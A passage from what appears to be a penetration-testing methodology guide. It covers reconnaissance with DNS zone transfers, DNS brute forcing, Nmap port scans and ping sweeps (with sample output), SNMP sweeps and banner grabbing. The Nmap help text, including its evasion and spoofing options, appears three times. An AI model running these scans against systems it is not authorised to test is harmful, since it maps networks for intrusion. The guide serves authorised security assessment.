<ul>
<li>Manual browsing</li>
<li>Google Hacking - [<a href="http://www.exploit-db.com/google-dorks">http://www.exploit-db.com/google-dorks</a> <a href="http://www.exploit-db.com/google-dorks">http://www.exploit-db.com/google-dorks</a>]</li>
</ul>
<h4 id="passive-reconnaissance">Passive Reconnaissance</h4>
<ul>
<li>Google Hacking - [<a href="http://www.exploit-db.com/google-dorks">http://www.exploit-db.com/google-dorks</a> <a href="http://www.exploit-db.com/google-dorks">http://www.exploit-db.com/google-dorks</a>]</li>
</ul>
<h4 id="active-footprinting">Active Footprinting</h4>
<p>The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction.</p>
<h5 id="zone-transfers">Zone Transfers</h5>
<p>DNS zone transfer, also known as AXFR, is a type of DNS transaction.  It is a mechanism designed to replicate the databases containing the DNS data across a set of DNS servers.  Zone transfer comes in two flavors, full (AXFR) and incremental (IXFR).  There are numerous tools available to test the ability to perform a DNS zone transfer.  Tools commonly used to perform zone transfers are host, dig, and nmap.</p>
<h6 id="host">Host</h6>
<p><pre>
host <nowiki>&lt;</nowiki>domain<nowiki>&gt;</nowiki> <nowiki>&lt;</nowiki>DNS server<nowiki>&gt;</nowiki></pre></p>
<h6 id="dig">Dig</h6>
<p><pre>dig @server domain axfr</pre></p>
<h5 id="reverse-dns">Reverse DNS</h5>
<p>Reverse DNS can be used to obtain valid server names in use within an organizational.  There is a caveat that it must have a PTR (reverse) DNS record for it to resolve a name from a provided IP address.  If it does resolve then the results are returned.  This is usually performed by testing the server with various IP addresses to see if it returns any results.</p>
<h5 id="dns-bruting">DNS Bruting</h5>
<p>After identifying all the information that is associated with the client domain(s), it is now time to begin to query DNS.  Since DNS is used to map IP addresses to hostnames, and vice versa we will want to see if it is insecurely configure.  We will seek to use DNS to reveal additional information about the client.  One of the most serious misconfigurations involving DNS is allowing Internet users to perform a DNS zone transfer.  There are several tools that we can use to enumerate DNS to not only check for the ability to perform zone transfers, but to potentially discover additional host names that are not commonly known.</p>
<h6 id="fierce2-linux">Fierce2 (Linux)</h6>
<p>For DNS enumeration, there are two tools that are utilized to provide the desired results.  The first that we will focus on is named Fierce2.  As you can probably guess, this is a modification on Fierce.  Fierce2 has lots of options, but the one that we want to focus on attempts to perform a zone transfer.  If that is not possible, then it performs DNS queries using various server names in an effort to enumerate the host names that have been registered.</p>
<p>The command to run ''fierce2'' is as follows: <br>
<pre>fierce -dns <nowiki>&lt;</nowiki>client domain<nowiki>&gt;</nowiki> -prefix <nowiki>&lt;</nowiki>wordlist<nowiki>&gt;</nowiki></pre></p>
<p>'''
[[:File:Penetration_Testing_Execution_29.png|Screenshot Here]]
'''</p>
<p>There is a common prefix (called common-tla.txt) wordlist that has been composed to utilize as a list when enumerating any DNS entries.  This can be found at the following URL:</p>
<p>:https://address-unknown/</p>
<h6 id="dnsenum-linux">DNSEnum (Linux)</h6>
<p>An alternative to Fierce2 for DNS enumeration is DNSEnum.  As you can probably guess, this is very similar to Fierce2.  DNSEnum offers the ability to enumerate DNS through brute forcing subdomains, performing reverse lookups, listing domain network ranges, and performing whois queries.  It also performs Google scraping for additional names to query.</p>
<p>'''
[[:File:Penetration_Testing_Execution_30.png|Screenshot Here]]
'''</p>
<p>The command to run ''dnsenum'' is as follows:<br>
<pre>dnsenum -enum -f <nowiki>&lt;</nowiki>wordlist<nowiki>&gt;</nowiki> <nowiki>&lt;</nowiki>client domain<nowiki>&gt;</nowiki></pre></p>
<p>'''
[[:File:Penetration_Testing_Execution_31.png|Screenshot Here]]
'''</p>
<p>Again, there is a common prefix wordlist that has been composed to utilize as a list when enumerating any DNS entries.  This can be found at the following URL:</p>
<p>:https://address-unknown/</p>
<h6 id="dnsdict6-linux">Dnsdict6 (Linux)</h6>
<p>Dnsdict6, which is part of the THC IPv6 Attack Toolkit, is an IPv6 DNS dictionary brute forcer.  The options are relatively simple, but simply specify the domain and a dictionary-file.</p>
<p>[[:File:Penetration_Testing_Execution_32.png|Screenshot Here]]</p>
<h5 id="port-scanning">Port Scanning</h5>
<h6 id="nmap-windowslinux">Nmap (Windows/Linux)</h6>
<p>Nmap ("Network Mapper") is the de facto standard for network auditing/scanning.  Nmap runs on both Linux and Windows.  Nmap is available in both command line and GUI versions.  For the sake of this document, we will only cover the command line.</p>
<pre>
Nmap 5.51 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script#default
  --script#<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args#<n1#v1,[n2#v2,...]>: provide arguments to scripts
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --log-errors: Log errors/warnings to the normal-format output file
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</pre>

<p>Nmap has dozens of options available.  Since this section is dealing with port scanning, we will focus on the commands required to perform this task.  It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned.  The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host.  This will become evident as we continue to discuss the options.</p>
<p>Based on the IP set being assessed you would want to scan both the TCP and UDP ports across the range 1 to 65535.  The command that will be utilized is as follows: <br>
<pre>nmap -A -PN -sU -sS -T2 -v -p 1-65535 <nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki>/<nowiki>&lt;</nowiki>CIDR<nowiki>&gt;</nowiki> or <nowiki>&lt;</nowiki>Mask<nowiki>&gt;</nowiki> -oA NMap_FULL_<nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki></pre></p>
<pre>
nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap_FULL_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time

NSE: Loaded 57 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 22:27
Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed
Initiating SYN Stealth Scan at 22:27
Scanning client.com (74.117.116.73) [65535 ports]
Discovered open port 80/tcp on 74.117.116.73
</pre>

<p>On large IP sets, those greater than 100 IP addresses, do not specify a port range.  The command that will be utilized is as follows: <br>
<pre>nmap -A -O -PN <nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki>/<nowiki>&lt;</nowiki>CIDR<nowiki>&gt;</nowiki> or <nowiki>&lt;</nowiki>Mask<nowiki>&gt;</nowiki> -oA NMap_<nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki></pre></p>
<pre>
nmap -A -O -PN client.com -oA NMap_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time

Nmap scan report for client.com (74.117.116.73)
Host is up (0.13s latency).
rDNS record for 74.117.116.73: 74-117-116-73.parked.com
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 2 disallowed entries
|_/click.php /ud.php
|_http-title: client.com
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-favicon: Parked.com domain parking
Warning: OSScan results may be unreliable because we could not find at least 1 o
pen and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%)
</pre>

<p>It should be noted that Nmap has limited options for IPv6.  These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection.</p>
<pre>
nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time

Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04)
Host is up (1.0s latency).
Not shown: 988 closed ports
PORT      STATE SERVICE
135/tcp   open  msrpc
445/tcp   open  microsoft-ds
554/tcp   open  rtsp
2869/tcp  open  icslap
3389/tcp  open  ms-term-serv
5000/tcp  open  upnp
5001/tcp  open  commplex-link
5002/tcp  open  rfe
5003/tcp  open  filemaker
5004/tcp  open  avt-profile-1
5357/tcp  open  wsdapi
10243/tcp open  unknown

Nmap done: 1 IP address (1 host up) scanned in 287.05 seconds
</pre>

<h5 id="snmp-sweeps">SNMP Sweeps</h5>
<p>SNMP sweeps are performed too as they offer tons of information about a specific system.  The SNMP protocol is a stateless, datagram oriented protocol.  Unfortunately SNMP servers don't respond to requests with invalid community strings and the underlying UDP protocol does not reliably report closed UDP ports.  This means that "no response" from a probed IP address can mean either of the following:</p>
<ul>
<li>machine unreachable</li>
<li>SNMP server not running</li>
<li>invalid community string</li>
<li>the response datagram has not yet arrived</li>
</ul>
<h6 id="snmpenum-linux">SNMPEnum (Linux)</h6>
<p>SNMPEnum is a perl script that sends SNMP requests to a single host, then waits for the response to come back and logs them.</p>
<p>[[:File:Penetration_Testing_Execution_37.png|Screenshot Here]]</p>
<h5 id="smtp-bounce-back">SMTP Bounce Back</h5>
<p>SMTP bounce back, also called a Non-Delivery Report/Receipt (NDR), a (failed) Delivery Status Notification (DSN) message, a Non-Delivery Notification (NDN) or simply a bounce, is an automated electronic mail message from a mail system informing the sender of another message about a delivery problem.  This can be used to assist an attacker in fingerprint the SMTP server as SMTP server information, including software and versions, may be included in a bounce message.</p>
<h5 id="banner-grabbing">Banner Grabbing</h5>
<p>Banner Grabbing is an enumeration technique used to glean information about computer systems on a network and the services running its open ports.  Banner grabbing is used to identify network the version of applications and operating system that the target host are running.</p>
<p>Banner grabbing is usually performed on Hyper Text Transfer Protocol (HTTP), File Transfer Protocol (FTP), and Simple Mail Transfer Protocol (SMTP); ports 80, 21, and 25 respectively.  Tools commonly used to perform banner grabbing are Telnet, nmap, and Netcat.</p>
<h6 id="http">HTTP</h6>
<p><pre>JUNK / HTTP/1.0</p>
<p>HEAD / HTTP/9.3</p>
<p>OPTIONS / HTTP/1.0</p>
<p>HEAD / HTTP/1.0</pre></p>
<h3 id="internal-footprinting">Internal Footprinting</h3>
<p>The Internal Footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction from an internal perspective.  The goal is to gather as much information about the target as possible.</p>
<h4 id="active-footprinting_1">Active Footprinting</h4>
<p>The active footprinting phase of Intelligence Gathering involves gathering response results from a target based upon direct interaction.</p>
<h5 id="ping-sweeps">Ping Sweeps</h5>
<p>Active footprinting begins with the identification of live systems.  This is usually performed by conducting a Ping sweep to determine which hosts respond.</p>
<h6 id="nmap-windowslinux_1">Nmap (Windows/Linux)</h6>
<p>Nmap ("Network Mapper") is the de facto standard for network auditing/scanning.  Nmap runs on both Linux and Windows.  Nmap is available in both command line and GUI versions.  For the sake of this document, we will only cover the command line.</p>
<pre>
Nmap 5.51 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script#default
  --script#<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args#<n1#v1,[n2#v2,...]>: provide arguments to scripts
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --log-errors: Log errors/warnings to the normal-format output file
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</pre>

<p>Nmap has dozens of options available.  Since this section is dealing with port scanning, we will focus on the commands required to perform this task.  It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned.  The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host.  This will become evident as we continue to discuss the options.</p>
<p>To perform a ping sweep you would want to utilize the following command: <br>
<pre>nmap -sn <nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki>/<nowiki>&lt;</nowiki>CIDR<nowiki>&gt;</nowiki> or <nowiki>&lt;</nowiki>Mask<nowiki>&gt;</nowiki> </pre></p>
<pre>
nmap -sn 10.25.0.0/24

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:58 Eastern Daylight Time

Nmap scan report for 10.25.0.1
Host is up (0.0030s latency).
MAC Address: C0:C1:C0:09:5C:16 (Unknown)
Nmap scan report for 10.25.0.111
Host is up (0.013s latency).
MAC Address: A8:E3:EE:97:3D:46 (Sony Computer Entertainment)
Nmap scan report for 10.25.0.113
Host is up.
Nmap scan report for 10.25.0.119
Host is up (0.018s latency).
MAC Address: 00:14:6C:B4:3A:93 (Netgear)
Nmap done: 256 IP addresses (4 hosts up) scanned in 6.19 seconds
</pre>

<h6 id="alive6-linux">Alive6 (Linux)</h6>
<p>Alive6, which is part of the THC IPv6 Attack Toolkit, offers the most effective mechanism for detecting all IPv6 systems.  <br></p>
<p>[[:File:Penetration_Testing_Execution_39.png|Screenshot Here]]</p>
<p>Alive6 offers numerous options, but can be simply run by just specifying the interface.  This returns all the IPv6 systems that are live on the local-link.</p>
<p>[[:File:Penetration_Testing_Execution_40.png|Screenshot Here]]</p>
<h5 id="port-scanning_1">Port Scanning</h5>
<h6 id="nmap-windowslinux_2">Nmap (Windows/Linux)</h6>
<p>Nmap ("Network Mapper") is the de facto standard for network auditing/scanning.  Nmap runs on both Linux and Windows.  Nmap is available in both command line and GUI versions.  For the sake of this document, we will only cover the command line.</p>
<pre>
Nmap 5.51 ( http://nmap.org )
Usage: nmap [Scan Type(s)] [Options] {target specification}
TARGET SPECIFICATION:
  Can pass hostnames, IP addresses, networks, etc.
  Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
  -iL <inputfilename>: Input from list of hosts/networks
  -iR <num hosts>: Choose random targets
  --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
  --excludefile <exclude_file>: Exclude list from file
HOST DISCOVERY:
  -sL: List Scan - simply list targets to scan
  -sn: Ping Scan - disable port scan
  -Pn: Treat all hosts as online -- skip host discovery
  -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
  -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
  -PO[protocol list]: IP Protocol Ping
  -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
  --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
  --system-dns: Use OS's DNS resolver
  --traceroute: Trace hop path to each host
SCAN TECHNIQUES:
  -sS/sT/sA/sW/sM: TCP SYN/Connect()/ACK/Window/Maimon scans
  -sU: UDP Scan
  -sN/sF/sX: TCP Null, FIN, and Xmas scans
  --scanflags <flags>: Customize TCP scan flags
  -sI <zombie host[:probeport]>: Idle scan
  -sY/sZ: SCTP INIT/COOKIE-ECHO scans
  -sO: IP protocol scan
  -b <FTP relay host>: FTP bounce scan
PORT SPECIFICATION AND SCAN ORDER:
  -p <port ranges>: Only scan specified ports
    Ex: -p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9
  -F: Fast mode - Scan fewer ports than the default scan
  -r: Scan ports consecutively - don't randomize
  --top-ports <number>: Scan <number> most common ports
  --port-ratio <ratio>: Scan ports more common than <ratio>
SERVICE/VERSION DETECTION:
  -sV: Probe open ports to determine service/version info
  --version-intensity <level>: Set from 0 (light) to 9 (try all probes)
  --version-light: Limit to most likely probes (intensity 2)
  --version-all: Try every single probe (intensity 9)
  --version-trace: Show detailed version scan activity (for debugging)
SCRIPT SCAN:
  -sC: equivalent to --script#default
  --script#<Lua scripts>: <Lua scripts> is a comma separated list of
           directories, script-files or script-categories
  --script-args#<n1#v1,[n2#v2,...]>: provide arguments to scripts
  --script-trace: Show all data sent and received
  --script-updatedb: Update the script database.
OS DETECTION:
  -O: Enable OS detection
  --osscan-limit: Limit OS detection to promising targets
  --osscan-guess: Guess OS more aggressively
TIMING AND PERFORMANCE:
  Options which take <time> are in seconds, or append 'ms' (milliseconds),
  's' (seconds), 'm' (minutes), or 'h' (hours) to the value (e.g. 30m).
  -T<0-5>: Set timing template (higher is faster)
  --min-hostgroup/max-hostgroup <size>: Parallel host scan group sizes
  --min-parallelism/max-parallelism <numprobes>: Probe parallelization
  --min-rtt-timeout/max-rtt-timeout/initial-rtt-timeout <time>: Specifies
      probe round trip time.
  --max-retries <tries>: Caps number of port scan probe retransmissions.
  --host-timeout <time>: Give up on target after this long
  --scan-delay/--max-scan-delay <time>: Adjust delay between probes
  --min-rate <number>: Send packets no slower than <number> per second
  --max-rate <number>: Send packets no faster than <number> per second
FIREWALL/IDS EVASION AND SPOOFING:
  -f; --mtu <val>: fragment packets (optionally w/given MTU)
  -D <decoy1,decoy2[,ME],...>: Cloak a scan with decoys
  -S <IP_Address>: Spoof source address
  -e <iface>: Use specified interface
  -g/--source-port <portnum>: Use given port number
  --data-length <num>: Append random data to sent packets
  --ip-options <options>: Send packets with specified ip options
  --ttl <val>: Set IP time-to-live field
  --spoof-mac <mac address/prefix/vendor name>: Spoof your MAC address
  --badsum: Send packets with a bogus TCP/UDP/SCTP checksum
OUTPUT:
  -oN/-oX/-oS/-oG <file>: Output scan in normal, XML, s|<rIpt kIddi3,
     and Grepable format, respectively, to the given filename.
  -oA <basename>: Output in the three major formats at once
  -v: Increase verbosity level (use -vv or more for greater effect)
  -d: Increase debugging level (use -dd or more for greater effect)
  --reason: Display the reason a port is in a particular state
  --open: Only show open (or possibly open) ports
  --packet-trace: Show all packets sent and received
  --iflist: Print host interfaces and routes (for debugging)
  --log-errors: Log errors/warnings to the normal-format output file
  --append-output: Append to rather than clobber specified output files
  --resume <filename>: Resume an aborted scan
  --stylesheet <path/URL>: XSL stylesheet to transform XML output to HTML
  --webxml: Reference stylesheet from Nmap.Org for more portable XML
  --no-stylesheet: Prevent associating of XSL stylesheet w/XML output
MISC:
  -6: Enable IPv6 scanning
  -A: Enable OS detection, version detection, script scanning, and traceroute
  --datadir <dirname>: Specify custom Nmap data file location
  --send-eth/--send-ip: Send using raw ethernet frames or IP packets
  --privileged: Assume that the user is fully privileged
  --unprivileged: Assume the user lacks raw socket privileges
  -V: Print version number
  -h: Print this help summary page.
EXAMPLES:
  nmap -v -A scanme.nmap.org
  nmap -v -sn 192.168.0.0/16 10.0.0.0/8
  nmap -v -iR 10000 -Pn -p 80
SEE THE MAN PAGE (http://nmap.org/book/man.html) FOR MORE OPTIONS AND EXAMPLES
</pre>

<p>Nmap has dozens of options available.  Since this section is dealing with port scanning, we will focus on the commands required to perform this task.  It is important to note that the commands utilized depend mainly on the time and number of hosts being scanned.  The more hosts or less time that you have to perform this tasks, the less that we will interrogate the host.  This will become evident as we continue to discuss the options.</p>
<p>Based on IP set being assessed, you would want to scan the both TCP and UDP across port range to 1-65535.  The command that will be utilized is as follows: <br>
<pre>nmap -A -PN -sU -sS -T2 -v -p 1-65535 <nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki>/<nowiki>&lt;</nowiki>CIDR<nowiki>&gt;</nowiki> or <nowiki>&lt;</nowiki>Mask<nowiki>&gt;</nowiki> -oA NMap_FULL_<nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki></pre></p>
<pre>
nmap -A -PN -sU -sS -T2 -v -p 1-65535 client.com -oA NMap_FULL_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:27 Eastern Daylight Time

NSE: Loaded 57 scripts for scanning.
Initiating Parallel DNS resolution of 1 host. at 22:27
Completed Parallel DNS resolution of 1 host. at 22:27, 0.10s elapsed
Initiating SYN Stealth Scan at 22:27
Scanning client.com (74.117.116.73) [65535 ports]
Discovered open port 80/tcp on 74.117.116.73
</pre>

<p>On large IP sets, those greater than 100 IP addresses do not specify a port range.  The command that will be utilized is as follows: <br>
<pre>nmap -A -O -PN <nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki>/<nowiki>&lt;</nowiki>CIDR<nowiki>&gt;</nowiki> or <nowiki>&lt;</nowiki>Mask<nowiki>&gt;</nowiki> -oA NMap_<nowiki>&lt;</nowiki>client ip range<nowiki>&gt;</nowiki></pre></p>
<pre>
nmap -A -O -PN client.com -oA NMap_client

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:37 Eastern Daylight Time

Nmap scan report for client.com (74.117.116.73)
Host is up (0.13s latency).
rDNS record for 74.117.116.73: 74-117-116-73.parked.com
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.2.3 ((CentOS))
| http-robots.txt: 2 disallowed entries
|_/click.php /ud.php
|_http-title: client.com
|_http-methods: No Allow or Public header in OPTIONS response (status code 200)
|_http-favicon: Parked.com domain parking
Warning: OSScan results may be unreliable because we could not find at least 1 o
pen and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Linux 2.6.X (92%), OpenBSD 4.X (88%), FreeBSD 6.X (88%)
</pre>

<p>It should be noted that Nmap has limited options for IPv6.  These include TCP connect (-sT), Ping scan (-sn), List scan (-sL) and version detection.</p>
<pre>
nmap -6 -sT -P0 fe80::80a5:26f2:8db7:5d04%12

Starting Nmap 5.51 ( http://nmap.org ) at 2011-04-22 22:42 Eastern Daylight Time

Nmap scan report for lancelot (fe80::80a5:26f2:8db7:5d04)
